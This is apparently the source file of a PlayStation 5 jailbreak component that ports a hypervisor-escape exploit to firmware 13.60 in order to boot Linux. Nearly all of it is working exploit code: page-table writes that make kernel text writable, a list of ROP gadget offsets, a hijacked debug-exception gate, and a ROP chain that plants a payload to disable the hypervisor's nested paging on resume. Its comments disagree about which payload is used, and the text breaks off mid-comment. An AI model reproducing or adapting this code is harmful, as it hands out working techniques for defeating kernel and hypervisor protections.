/*
 * hv_defeat_1360.c -- high-firmware (8.xx+) vector. Ported to 13.60; the
 * function keeps its upstream name because the offsets table it is built on
 * is still off_1320-derived and the vendor symbol names refer to it.
 *
 * The 3.00-7.61 path (hv_defeat_0304/0506/0607) defeats the hypervisor with
 * flatz' ACPI-wakeup ROP chain. That trick does not apply on high firmware.
 * Instead, per Byepervisor-Reborn, we:
 *
 *   1. Escape the guest: make kernel .text writable and clear the XOTEXT bit
 *      so the text can be patched (Byepervisor PTE walkers, vendored).
 *   2. Install a kernel-cave IDT-gate hook ("khook") on the S3 resume path on
 *      KERNEL_SYM_HV_MP_STARTUP_CALL. When it fires, the action chain stages the
 *      AP payload on the startup_mp page and stamps a cookie; the hypervisor
 *      launches that AP in root-0 with RSI, RCX and RDX as the khook left them.
 *   3. The AP payload is hv_boot, which abandons the guest: it switches CR3 to
 *      the identity table built at cave_hv_paging and jumps into shellcode_hv at
 *      cave_hv_code, which tears down the hypervisor and boots Linux bare-metal.
 *
 * hv_defeat_1360_post_resume() is from an earlier design in which break_hv
 * cleared NPT and returned to the guest, after which a second khook on
 * SYS_GETUID drove a takeover blob. Nothing on the hv_boot path uses it; what is
 * left of it here polls for the cookie, which is still how a hook that did not
 * fire is detected. Its takeover half is dead code and is marked as such.
 */

#include "config.h"
#include "hv_defeat_1360.h"

/* The PS5 kernel's own sleep, from libkernel. libc's sleep() is a nanosleep whose
 * timeout does not survive the S3 resume: the process comes back from the suspend
 * and never wakes from it, which shows up as a terminal that goes silent at the
 * moment the console sleeps and never says another word. Byepervisor's payload uses
 * this one, and it is the only difference in the poll loop between the two. */
int sceKernelSleep(int secs);
#include "linux.h"
#include "loader.h"
#include "shellcode_hv.h"
#include "break_hv.h"
#include "takeover.h"
#include "utils.h"

#include <ps5/kernel.h>
#include <errno.h>
#include <fcntl.h>
#include <stddef.h>
#include <stdint.h>
#include <sys/mman.h>
#include <string.h>
#include <sys/time.h>
#include <sys/syscall.h>
#include <unistd.h>

#include "byepervisor/kdlsym.h"
#include "byepervisor/khook.h"
#include "byepervisor/paging.h"

#define STATE_ARMED 0x4B484F4F4B454401ULL // 'KHOOKED.'
#define COOKIE_VAL 0xCAFE133741414141ULL
#define HOOK_CORE 0
#define HOOK_IST 6
#define TSS_STRIDE 0x68
#define STARTUP_MP_PAYLOAD_PAGE 0x3FFFF000ULL

#define CAVE_STATE_OFF 0x600
#define CAVE_SAVE_OFF 0x620

/* Set by hv_defeat_1360() before rest mode, consumed by the post-resume
 * takeover. Break_hv writes its cookie to g_oracle when the resume payload
 * runs, which is how we detect that NPT is off and the AP is back in-guest. */
static uint64_t g_oracle;
static uint64_t g_payload_va;
static int g_armed;
static int g_cave_staged;

/* khook wants int-returning read/write function pointers; the project helpers
 * are void, so wrap them. */
static int by_read(uint64_t kaddr, void *dst, size_t len) {
  kread(kaddr, dst, len);
  return 0;
}

static int by_write(uint64_t kaddr, const void *src, size_t len) {
  kwrite(kaddr, (void *)src, len);
  return 0;
}

/*
 * Fail fast (with a notification) if the fields this vector needs are not
 * populated for the running firmware. Fields used only by the (not yet wired)
 * Linux prep are intentionally excluded so the escape can run today.
 */
static int check_offsets(void) {
  const struct {
    const char *name;
    uint64_t value;
  } need[] = {
      {"HV_MP_STARTUP_CALL", env_offset.KERNEL_SYM_HV_MP_STARTUP_CALL},
      {"PMAP_STORE", env_offset.KERNEL_SYM_PMAP_STORE},
      {"DATA_CAVE", env_offset.KERNEL_SYM_DATA_CAVE},
      {"DMPML4I", env_offset.KERNEL_SYM_DMPML4I},
      {"DMPDPI", env_offset.KERNEL_SYM_DMPDPI},
      {"PML4PML4I", env_offset.KERNEL_SYM_PML4PML4I},
      {"IDT", env_offset.IDT},
      {"COMMON_TSS", env_offset.COMMON_TSS},
      {"HV_SYM_HEAP_BASE", env_offset.HV_SYM_HEAP_BASE},
      {"HV_SYM_PCPUS", env_offset.HV_SYM_PCPUS},
      {"HV_LOADER_PA_REGULAR", env_offset.HV_LOADER_PA_REGULAR},
      {"GAD_ADD_RSP_28_POP_RBP_RET", env_offset.GAD_ADD_RSP_28_POP_RBP_RET},
      {"GAD_IRETQ", env_offset.GAD_IRETQ},
      {"GAD_POP_RCX_RET", env_offset.GAD_POP_RCX_RET},
      {"GAD_POP_RDI_RET", env_offset.GAD_POP_RDI_RET},
      {"GAD_POP_RSI_RET", env_offset.GAD_POP_RSI_RET},
      {"GAD_POP_RDX_RET", env_offset.GAD_POP_RDX_RET},
      {"GAD_POP_RSP_RET", env_offset.GAD_POP_RSP_RET},
      {"GAD_POP_R8", env_offset.GAD_POP_R8},
      {"GAD_STORE_RCX_R8", env_offset.GAD_STORE_RCX_R8},
      {"GAD_STORE_RDI8_RCX", env_offset.GAD_STORE_RDI8_RCX},
      {"GAD_OR_RCX_EAX", env_offset.GAD_OR_RCX_EAX},
      {"GAD_SET_DR7", env_offset.GAD_SET_DR7},
      {"GAD_ST_RCX_RDX", env_offset.GAD_ST_RCX_RDX},
      {"GAD_ST_RCX_RAX", env_offset.GAD_ST_RCX_RAX},
      {"GAD_MOV_RAX_RSI", env_offset.GAD_MOV_RAX_RSI},
      {"GAD_MOV_RAX_RDI", env_offset.GAD_MOV_RAX_RDI},
      {"GAD_REP_MOVSB", env_offset.GAD_REP_MOVSB},
      {"GAD_CLD", env_offset.GAD_CLD},
      {"GAD_RET_TRAMP", env_offset.GAD_RET_TRAMP},
      {"GAD_DBREG_RESUME", env_offset.GAD_DBREG_RESUME},
  };

  for (size_t i = 0; i < sizeof(need) / sizeof(need[0]); i++) {
    if (!need[i].value) {
      notify("13.60: missing offset %s\n", need[i].name);
      return -1;
    }
  }
  return 0;
}

/* Make the kernel .text RW and clear XOTEXT so it can be patched. */
static void escape_kernel_text(uint64_t kernel_pmap) {
  uint64_t entry_addr, entry;

  for (uint64_t addr = ktext; addr < kdata; addr += 0x1000) {
    entry_addr = find_pde(kernel_pmap, addr, &entry);
    if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(entry_addr, entry);
    }

    entry_addr = find_pte(kernel_pmap, addr, &entry);
    if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
      CLEAR_PDE_BIT(entry, XOTEXT);
      SET_PDE_BIT(entry, RW);
      kwrite64(entry_addr, entry);
    }
  }
}

/* Make STARTUP_MP_PAYLOAD_PAGE executable in the guest page tables so the HV can
 * call into it after resume. */
static void map_payload_executable(uint64_t kernel_pmap) {
  uint64_t va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint64_t entry_addr, entry;

  entry_addr = find_pml4e(kernel_pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);
  }

  entry_addr = find_pdpe(kernel_pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);
  }

  entry_addr = find_pde(kernel_pmap, va, &entry);
  if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
    CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
    kwrite64(entry_addr, entry);

    if (PDE_FIELD(entry, PS) != 1) {
      entry_addr = find_pte(kernel_pmap, va, &entry);
      if (entry_addr != 0xFFFFFFFFFFFFFFFFull) {
        CLEAR_PDE_BIT(entry, EXECUTE_DISABLE);
        kwrite64(entry_addr, entry);
      }
    }
  }
}

/* HV loader carveout base, hardcoded to the retail/"regular" SoC value.
 *
 * The earlier note here claimed sceKernelGetMainSocId() could not be resolved by
 * elfldr on retail. That is not so: the reference Byepervisor payload calls it
 * and reports "Regular model detected" on this console. The value below is
 * therefore right for a Phat, which is what this port was built and tested on,
 * but a Pro would need HV_LOADER_PA_PRO and this function does not distinguish
 * them. Left as-is rather than adding a probe that has never been run. */
/* Whether ktext + G_VBIOS really points at a PCI option ROM. Established before
 * the suspend, where the log still works, and used after it, where nothing can
 * be written and a wrong offset would otherwise go unnoticed. */
static int vbios_signature_ok;

static uint64_t hv_base_pa(void) {
  return env_offset.HV_LOADER_PA_REGULAR;
}

/*
 * Stage everything shellcode_hv needs into the identity-mapped cave before we
 * enter rest mode. shellcode_hv runs with the identity CR3, so everything it
 * reads must live in the cave (4 GiB physical, mapped by the 5 GiB identity
 * table) and be addressed by physical address:
 *
 *   cave_hv_paging  : PML4 + PDPT covering 0..5 GiB (identity)
 *   cave_hv_code    : the shellcode_hv blob
 *   cave_linux_info : struct linux_info (bzimage/initrd now cave PAs)
 *   cave_bzImage    : bzImage, followed by the initrd
 *
 * All of this is written through the kernel direct map before entering rest
 * mode, so it is already in place when the resume payload jumps to shellcode_hv.
 */
static void stage_identity_map(void) {
  uint64_t identity_pml4_0 = cave_hv_paging + 0x1003ULL;
  /* Five 1 GiB pages covering 0..5 GiB. This matches the reference boot path's table
   * exactly, and it is enough: the cave (4 GiB), hv_base_rsp (4.25 GiB) and the
   * IOMMU and AMDGPU MMIO windows all sit below 5 GiB.
   *
   * Do NOT add a sixth entry on the strength of the comments in
   * the reference boot path - they are off by one and call the 4 GiB entry
   * "5 GB to 6 GB". The entry value is what matters and it is 4-5 GiB there too. */
  uint64_t l3[] = {
      0x0000000000000083, // 0-1 GiB
      0x0000000040000083, // 1-2 GiB
      0x0000000080000083, // 2-3 GiB
      0x00000000C0000083, // 3-4 GiB
      0x0000000100000083  // 4-5 GiB (cave + shellcode_hv + hv_base_rsp)
  };

  kwrite64(pa_to_dmap(cave_hv_paging), identity_pml4_0);
  for (size_t i = 0; i < sizeof(l3) / sizeof(l3[0]); i++)
    kwrite64(pa_to_dmap(PAGE_PA(identity_pml4_0) + i * 8), l3[i]);

  /* The payload executes at a *high* direct-map VA (kdldmap of the payload
   * page), so after `mov cr3` the very next instruction would fault unless the
   * identity table also maps that VA. Alias the payload's 1 GiB region to the
   * matching physical range with a single 1 GiB page in a second PDPT. */
  uint64_t dmap_base = kdldmap(0);
  uint64_t payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint32_t pm4idx = (payload_va >> 39) & 0x1FF;
  uint32_t pdpi = (payload_va >> 30) & 0x1FF;
  uint64_t high_pdpt_pa = cave_hv_paging + 0x2000ULL;
  uint64_t high_entry =
      ((payload_va - dmap_base) & ~0x3FFFFFFFULL) | 0x83ULL;

  if (pm4idx != 0) {
    kwrite64(pa_to_dmap(cave_hv_paging + (uint64_t)pm4idx * 8),
             high_pdpt_pa | 0x3ULL);
    kwrite64(pa_to_dmap(high_pdpt_pa + (uint64_t)pdpi * 8), high_entry);
  }
}

/* Copy a file straight into the cave, one chunk at a time.
 *
 * The obvious shape - map the whole image, read it, then copy it into the cave -
 * needs a 41 MB anonymous mapping, and measured on 13.60 that mapping before the
 * suspend is what stops the console coming back: with it the resume powers the
 * console off, without it the resume completes and NP_ENABLE is cleared. Nothing
 * needs the whole image at once, so it is never materialised.
 *
 * The cave is inside the identity page table staged at cave_hv_paging, so it is
 * written through the direct map as usual. */
#define LINUX_CHUNK 0x4000

#define LINUX_CHUNK 0x4000
static uint8_t g_linux_chunk[LINUX_CHUNK];

static int stream_file_into_cave(uint64_t dst_pa, const char *path, size_t size,
                                 const char *what) {
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    notify("13.60: cannot open %s to stage %s (errno %d)\n", path, what, errno);
    return -1;
  }

  size_t done = 0;
  while (done < size) {
    size_t want = size - done;
    if (want > sizeof(g_linux_chunk))
      want = sizeof(g_linux_chunk);

    ssize_t n = read(fd, g_linux_chunk, want);
    if (n <= 0) {
      int e = errno;
      close(fd);
      notify("13.60: read %s failed at %zu of %zu B (returned %zd, errno %d)\n",
             what, done, size, n, e);
      return -1;
    }

    /* kwrite_large, not kwrite: kwrite is a single kernel_copyin() and a large
     * one hangs the payload outright. kwrite_large chunks at 4 KB internally. */
    kwrite_large(pa_to_dmap(dst_pa + done), g_linux_chunk, (size_t)n);
    done += (size_t)n;
  }

  close(fd);
  notify("13.60: streamed %s (%zu B) into the cave at %#lx.\n", what, size,
         (unsigned long)dst_pa);
  return 0;
}

/* Compare a streamed image against its file, at the head, the middle and the
 * tail. Returns 0 when they agree. */
static int verify_streamed(uint64_t dst_pa, const char *path, size_t size,
                           const char *what) {
  int fd = open(path, O_RDONLY);
  if (fd < 0) {
    notify("13.60: verify %s: cannot reopen %s\n", what, path);
    return -1;
  }

  static const size_t probe = 0x1000;
  static uint8_t from_file[0x1000];
  static uint8_t from_cave[0x1000];
  const size_t offsets[3] = {0, size / 2 & ~(size_t)0xFFF,
                             (size > probe ? size - probe : 0) & ~(size_t)0xFFF};

  for (int i = 0; i < 3; i++) {
    size_t off = offsets[i];
    if (lseek(fd, (off_t)off, SEEK_SET) < 0) {
      close(fd);
      notify("13.60: verify %s: seek to %zu failed\n", what, off);
      return -1;
    }
    ssize_t n = read(fd, from_file, probe);
    if (n <= 0) {
      close(fd);
      notify("13.60: verify %s: read at %zu returned %zd\n", what, off, n);
      return -1;
    }

    kread(pa_to_dmap(dst_pa + off), from_cave, (size_t)n);
    if (memcmp(from_file, from_cave, (size_t)n) != 0) {
      /* A mismatch is not a transient failure - the bytes are wrong, and they
       * will be just as wrong on the next attempt. Retrying thirty times would
       * only hide it.
       *
       * Nothing can be written after the resume: the USB stick is re-enumerated
       * and gone, and /data/ reads but does not take writes, so the log ends at
       * the last line before the sleep no matter what this code does. The
       * console is therefore the only output available, and it is an unambiguous
       * one: park here and the console stays on, hand over to Linux and it powers
       * off about five seconds later, which is exactly what it does now.
       *
       * So a run that leaves the console alive means the staged images are wrong.
       * A run that still powers the console off means they are fine and the
       * fault is further in - the kernel, the boot parameters, or the hardware. */
      notify("13.60: verify %s: MISMATCH at offset %zu (%zd B). "
             "Parking WITHOUT handing over to Linux, so that the console "
             "staying on reports the bad image.\n", what, off, n);
      close(fd);
      for (;;)
        sleep(30);
    }
  }

  close(fd);
  notify("13.60: verify %s: %zu B match at head, middle and tail.\n", what,
         size);
  return 0;
}

static int stage_hv_boot(void) {
  if (!linux_bzimage_path[0] || !linux_initrd_path[0] ||
      linux_bzimage_len == 0 || linux_initrd_len == 0) {
    notify("13.60: Linux images missing, cannot stage HV boot.\n");
    return -1;
  }

  /* Identity map + the shellcode_hv blob it will jump into. */
  stage_identity_map();

  kwrite(pa_to_dmap(cave_hv_code), shellcode_hv_bin, shellcode_hv_bin_len);

  /* Build the linux_info the HV shellcode reads from cave_linux_info, with the
   * kernel/initrd relocated to identity-mapped physical addresses. */
  struct linux_info info = linux_i;
  info.linux_info = cave_linux_info;
  info.bzimage = cave_bzImage;
  info.bzimage_size = linux_bzimage_len;
  info.initrd = cave_bzImage + ALIGN_UP(linux_bzimage_len, PAGE_SIZE);
  info.initrd_size = linux_initrd_len;
  info.n_tmrs = 0;

#if HV_HEADLESS_SINGLE_CORE
  /* The khook payload only runs on one core; tell Linux not to try to bring up
   * the APs (which are still parked in the hypervisor). */
  if (strlen(info.cmdline) + sizeof(" maxcpus=1 nosmp") <=
      sizeof(info.cmdline))
    strcat(info.cmdline, " maxcpus=1 nosmp");
#endif

  /* The GPU's VBIOS, which the kernel expects to find at 0xC0000. It lives in
   * the kernel's data as ktext + G_VBIOS and shellcode_hv cannot reach it: it
   * runs on the identity map, where only the first 5 GiB exists and the kernel's
   * virtual addresses do not. So it is copied into the cave here and moved into
   * place by shellcode_hv, which can write physical addresses directly. */
  info.vbios = info.initrd + ALIGN_UP(linux_initrd_len, PAGE_SIZE);
  info.vbios_size = 0x10000;

  kwrite(pa_to_dmap(cave_linux_info), &info, sizeof(struct linux_info));
  if (stream_file_into_cave(info.bzimage, linux_bzimage_path,
                            info.bzimage_size, "bzImage") ||
      stream_file_into_cave(info.initrd, linux_initrd_path, info.initrd_size,
                            "initrd"))
    return -1;

  /* Read the images back and compare them with the files.
   *
   * Nothing checked this before. The staging reported that it had streamed N
   * bytes and that was taken as done, so a truncated or misplaced copy would
   * have looked exactly like a healthy one - and a kernel that cannot unpack its
   * initramfs panics within a few seconds, which is precisely the symptom. The
   * head, one chunk in the middle and the tail of each image are enough to catch
   * a short copy, an off-by-one in the destination and a source that ran out. */
  if (verify_streamed(info.bzimage, linux_bzimage_path, info.bzimage_size,
                      "bzImage") ||
      verify_streamed(info.initrd, linux_initrd_path, info.initrd_size, "initrd"))
    return -1;

  {
    static uint8_t vbios_chunk[0x1000];

    /* Look before writing. G_VBIOS is the one offset in this path that no dump
     * ever confirmed - it sits past the end of the 46 MB kernel image, so the
     * byte-level check cannot reach it. If it is wrong, the read yields rubbish
     * and putting that at 0xC0000 would hand the kernel a bogus ROM.
     *
     * A PCI option ROM starts 55 AA. Read the first bytes and only copy if they
     * are there, which keeps a bad offset from writing anything at all. */
    if (!vbios_signature_ok) {
      info.vbios_size = 0;
    } else {
      for (size_t off = 0; off < info.vbios_size; off += sizeof(vbios_chunk)) {
        size_t n = info.vbios_size - off;
        if (n > sizeof(vbios_chunk))
          n = sizeof(vbios_chunk);
        kread(ktext + env_offset.G_VBIOS + off, vbios_chunk, n);
        kwrite_large(pa_to_dmap(info.vbios + off), vbios_chunk, n);
      }
      notify("13.60: VBIOS signature ok; copied %zu B into the cave at %#lx.\n",
             (size_t)info.vbios_size, (unsigned long)info.vbios);
    }
  }

  notify("13.60: staged shellcode_hv (%u B) + Linux @ %#lx/%#lx.\n",
         shellcode_hv_bin_len, (unsigned long)info.bzimage,
         (unsigned long)info.initrd);
  return 0;
}

/*
 * Stage the break_hv payload + its Byepervisor param block at
 * STARTUP_MP_PAYLOAD_PAGE, then install the resume khook so that the HV's
 * startup_mp call gets its RSI redirected to the payload. break_hv disables
 * NPT on every core and jumps back to the guest init vector, so the console
 * resumes normally and we can run the takeover from the BSP afterwards.
 *
 * Param layout (matches break_hv's entry.S / Byepervisor):
 *   [0]=init_cb  [1]=dmap  [2]=cookie addr  [3]=carveout  [4]=heap  [5]=pcpus
 */

/*
 * Self-test, lifted from the reference payload that defeated the hypervisor on
 * this console. It hooks a function that is called immediately (getuid+0xE)
 * rather than the startup_mp call site, arms it with the same kh_trigger, then
 * calls getuid() and checks that the action chain stamped the cookie.
 *
 * The point is to separate two failures that look identical from the outside.
 * If this hangs, kh_trigger does not work in this binary for reasons that have
 * nothing to do with the Linux staging. If it passes and the real hook then
 * hangs, the staging done beforehand - the identity page table and tens of
 * megabytes of kernel and initrd written into the cave - is what broke the #DB
 * path, and moving it after the trigger is the fix.
 */
int khook_selftest(void) {
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x800];
  uint64_t scratch = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t oracle = scratch + KH_OFF_USER;
  int ret;

  kwrite64(oracle, 0);

  ret = kh_init(&hook, by_read, by_write, ktext, scratch, HOOK_IST);
  if (ret) {
    notify("selftest: kh_init rc=%d\n", ret);
    return ret;
  }
  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  hook.oneshot = 1;
  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_SYS_GETUID) + 0xE);
  kh_set_resume_rax(&hook, 0x12345678);

  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, 0xCAFE133741414141ULL);

  ret = kh_install(&hook, &chain);
  notify("selftest: kh_install rc=%d\n", ret);
  if (ret)
    return ret;

  notify("selftest: triggering...\n");
  kh_trigger(&hook);
  notify("selftest: triggered, calling getuid()\n");

  long r = syscall(SYS_getuid);
  uint64_t o = kread64(oracle);
  int pass = (o == 0xCAFE133741414141ULL);
  notify("selftest: oracle=%#lx getuid=%ld -> %s\n", (unsigned long)o, r,
         pass ? "PASS" : "FAIL");

  kh_disarm(&hook);
  return pass ? 0 : -1;
}

/*
 * Verify the staging hv_boot depends on, without switching CR3.
 *
 * hv_boot jumps to cave_hv_code as a physical address after loading
 * cave_hv_paging into CR3, so three things have to be true or the AP faults the
 * moment it runs and the console never comes back from rest mode:
 *
 *   - the PML4 at cave_hv_paging maps the low 0..5 GiB identity
 *   - the shellcode_hv blob is actually at cave_hv_code
 *   - the PML4 also aliases the payload's direct-map VA, because the instruction
 *     after `mov cr3` is fetched from there
 *
 * All of it is readable from the guest, so it can be checked before sleeping.
 */
static void verify_hv_staging(void) {
  uint64_t pml4_pa = cave_hv_paging;
  uint64_t pml4_0 = kread64(pa_to_dmap(pml4_pa));
  uint64_t pdpt_pa = PAGE_PA(pml4_0);
  uint64_t dmap_base = kdldmap(0);
  uint64_t payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  uint32_t pm4idx = (payload_va >> 39) & 0x1FF;
  uint32_t pdpi = (payload_va >> 30) & 0x1FF;
  uint64_t high = kread64(pa_to_dmap(pml4_pa + (uint64_t)pm4idx * 8));
  uint64_t high_pdpt = PAGE_PA(high);
  uint64_t high_entry = kread64(pa_to_dmap(high_pdpt + (uint64_t)pdpi * 8));
  uint64_t code0 = kread64(pa_to_dmap(cave_hv_code));
  uint64_t expect_pa = (payload_va - dmap_base) & ~0x3FFFFFFFULL;

  notify("13.60: [staging] PML4[0]=%#lx -> PDPT pa %#lx\n",
         (unsigned long)pml4_0, (unsigned long)pdpt_pa);
  for (int i = 0; i < 5; i++)
    notify("13.60: [staging]   low %d GiB entry=%#lx\n", i,
           (unsigned long)kread64(pa_to_dmap(pdpt_pa + (uint64_t)i * 8)));

  notify("13.60: [staging] payload VA %#lx pm4idx=%u pdpi=%u\n",
         (unsigned long)payload_va, pm4idx, pdpi);
  notify("13.60: [staging] high PML4[%u]=%#lx -> PDPT %#lx\n", pm4idx,
         (unsigned long)high, (unsigned long)high_pdpt);
  notify("13.60: [staging] high PDPT[%u]=%#lx (want pa %#lx | 0x83)\n", pdpi,
         (unsigned long)high_entry, (unsigned long)expect_pa);

  notify("13.60: [staging] cave_hv_code %#lx holds %#lx %#lx\n",
         (unsigned long)cave_hv_code, (unsigned long)code0,
         (unsigned long)kread64(pa_to_dmap(cave_hv_code + 8)));

  /* The cave is written through pa_to_dmap (dmap + pa, where dmap is derived
   * from the kernel pmap) while the payload page is addressed through the SDK's
   * kdldmap. If those two bases differ, every staging write lands somewhere the
   * AP will never read, hv_boot loads a garbage CR3 and the console dies on
   * resume - which is exactly what happens. Print both for the same page. */
  notify("13.60: [staging] dmap=%#lx  kdldmap(0)=%#lx  diff=%#lx\n",
         (unsigned long)dmap, (unsigned long)kdldmap(0),
         (unsigned long)(dmap - kdldmap(0)));
  notify("13.60: [staging] pa_to_dmap(4GiB)=%#lx  kdldmap(4GiB)=%#lx\n",
         (unsigned long)pa_to_dmap(cave_hv_paging),
         (unsigned long)kdldmap(cave_hv_paging));
  notify("13.60: [staging] read back via kdldmap: PML4[0]=%#lx\n",
         (unsigned long)kread64(kdldmap(cave_hv_paging)));

  if (pm4idx == 0)
    notify("13.60: [staging] WARNING: payload VA is in the low PML4 slot, the "
           "alias branch never ran\n");
  if (pdpt_pa != cave_hv_paging + 0x1000)
    notify("13.60: [staging] WARNING: low PDPT is not where it was written\n");
  if (high_pdpt != cave_hv_paging + 0x2000)
    notify("13.60: [staging] WARNING: high PDPT is not where it was written\n");
  if ((high_entry & ~0x3FFFFFFFULL) != expect_pa)
    notify("13.60: [staging] WARNING: high alias maps wrong physical region\n");
  if (code0 == 0)
    notify("13.60: [staging] WARNING: cave_hv_code looks empty\n");
}

static int install_resume_hook(uint64_t cave_addr) {
  khook_t hook;
  kh_chain_t chain;
  uint8_t chain_buf[0x800];
  uint64_t scratch = kdlsym(KERNEL_SYM_DATA_CAVE);
  uint64_t oracle = scratch + KH_OFF_USER;
  uint64_t payload_va = kdldmap(STARTUP_MP_PAYLOAD_PAGE);
  /* params are written by the action chain, not here */
  uint64_t hv_base = hv_base_pa();
  int ret;

  /* Stage the AP payload in the kernel cave; the action chain copies it onto the
   * startup_mp page at resume time, which is the sequence the proven Byepervisor
   * payload uses.
   *
   * The blob is break_hv, and it must be. break_hv clears NP_ENABLE on all 16
   * VMCBs and RETURN TO THE GUEST, so the S3 resume completes and the console
   * comes back. hv_boot does the opposite - it abandons the guest and jumps
   * straight into shellcode_hv - and that cannot work from here: the resume
   * handshake never completes, the console powers itself off about five seconds
   * after the wake, and the payload process never returns to log anything. This
   * was measured, not reasoned: an AP payload that only does cli; hlt, touching
   * nothing, powers the console off just the same.
   *
   * So the hypervisor is escaped in two steps, as the original design intends:
   * this hook clears NPT and returns, and hv_defeat_1360_post_resume() then drives
   * shellcode_hv from the resumed guest. */
  kwrite(scratch + 0x1000, break_hv_bin, break_hv_bin_len);
  notify("13.60: [A] payload staged, hv_base=%#lx\n", (unsigned long)hv_base);

  notify("13.60: [B] params staged\n");

  kwrite64(oracle, 0);

  ret = kh_init(&hook, by_read, by_write, ktext, scratch, HOOK_IST);
  notify("13.60: [C] kh_init rc=%d\n", ret);
  if (ret)
    return ret;

  hook.tss_stride = TSS_STRIDE;
  kh_set_tables(&hook, kdlsym(KERNEL_SYM_IDT_ARRAY),
                kdlsym(KERNEL_SYM_COMMON_TSS));
  kh_set_core(&hook, HOOK_CORE);
  hook.oneshot = 1;

  kh_set_hook_target(&hook, kdlsym(KERNEL_SYM_HV_MP_STARTUP_CALL));
#ifdef DIAG_EMPTY_CHAIN
  /* The chain carries nothing, so the AP page is never populated. Point the
   * launch back at the stock vector instead, or the AP would start on whatever
   * happens to be at 0x3ffff000 and the test would measure that instead. */
  kh_set_resume_rsi(&hook, kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
#else
  kh_set_resume_rsi(&hook, payload_va);
#endif

  /* RDX carries CR3 into khv_startup_mp: the hypercall's argument set is
   * RAX=0xf, RBX=core, RCX=AP RIP, RDX=CR3, so redirecting RSI alone leaves the
   * launch without its address space. The proven Byepervisor payload sets this;
   * this one did not, and that is the difference between an escape that fires
   * and one that stops at kh_trigger.
   *
   * Read straight out of pmap_store+0x28 exactly as the proven payload does,
   * rather than walked out of proc 0's vmspace, so the value is the same one
   * that is known to work. */
  kh_set_resume_rdx(&hook, kread64(kdlsym(KERNEL_SYM_PMAP_STORE) + 0x28));

  /* The action chain, laid out exactly as the proven Byepervisor payload builds
   * it. It runs in kernel context when the DR0 breakpoint fires, and it does the
   * work the guest cannot: it copies the AP payload from the cave onto the
   * startup_mp page, writes the parameter block the AP reads, and stamps the
   * cookie the post-resume phase polls. An empty chain here was the last
   * difference between this port and a payload that fires. */
  kh_chain_init(&chain, chain_buf, sizeof chain_buf);
  kh_chain_store(&chain, oracle, 0xCAFE133741414141ULL);

#ifdef DIAG_EMPTY_CHAIN
  /* Diagnostic: arm the breakpoint for real but give the chain nothing to do
   * beyond the cookie. If the console survives, the breakpoint firing early -
   * during the suspend rather than on the resume - is what kills it, and it is
   * the chain's writes into guest memory that do the damage. The images alone
   * are safe, the installed hook is safe, and the armed breakpoint is the one
   * remaining difference.
   */
  notify("13.60: DIAG_EMPTY_CHAIN: chain carries the cookie only.\n");
#else
  kh_chain_g(&chain, KERNEL_GADGET_POP_RDX);
  kh_chain_q(&chain, kread64(kdlsym(KERNEL_SYM_PMAP_STORE) + 0x28));
  kh_chain_g(&chain, KERNEL_GADGET_POP_RCX);
  kh_chain_q(&chain, oracle + 0x08);
  kh_chain_g(&chain, KERNEL_GADGET_ST_RCX_RDX);
  kh_chain_memcpy(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE), scratch + 0x1000,
                  0xF00);
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF00),
                 kdlsym(KERNEL_SYM_MP_STARTUP_INIT_VECTOR));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF08), kdldmap(0));
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF10), oracle);
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF18), hv_base);
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF20),
                 hv_base + env_offset.HV_SYM_HEAP_BASE);
  kh_chain_store(&chain, kdldmap(STARTUP_MP_PAYLOAD_PAGE + 0xF28),
                 hv_base + env_offset.HV_SYM_PCPUS);
#endif

  ret = kh_install(&hook, &chain);
  notify("13.60: [D] kh_install rc=%d\n", ret);
  if (ret)
    return ret;

  notify("13.60: [E] triggering...\n");
#ifdef DIAG_NO_TRIGGER
  /* Diagnostic: everything the hook needs is installed - the IDT gate is
   * redirected, the TSS IST slot points at the chain, the chain and break_hv are
   * written - but kh_trigger is not called, so DR0/DR7 are never armed and the
   * breakpoint never exists.
   *
   * The images alone are safe and the hook alone is safe; it is the two together
   * that stop the console coming back. This separates the two halves of the hook:
   * a live execute breakpoint, or the redirected #DB gate and IST slot. */
  notify("13.60: DIAG_NO_TRIGGER: installed but not armed.\n");
#else
  kh_trigger(&hook);
  notify("13.60: [F] triggered\n");
#endif

  g_oracle = oracle;
  g_payload_va = payload_va;
  g_armed = 1;

  kwrite64(cave_addr + CAVE_STATE_OFF, STATE_ARMED);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x00, hook.saved_gate_lo);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x08, hook.saved_gate_hi);
  kwrite64(cave_addr + CAVE_SAVE_OFF + 0x10, hook.saved_ist);

  return 0;
}

/*
 * Post-resume. On the hv_boot path this is only a detector: the AP payload either
 * takes over the machine (and nothing here ever runs) or the hook did not fire,
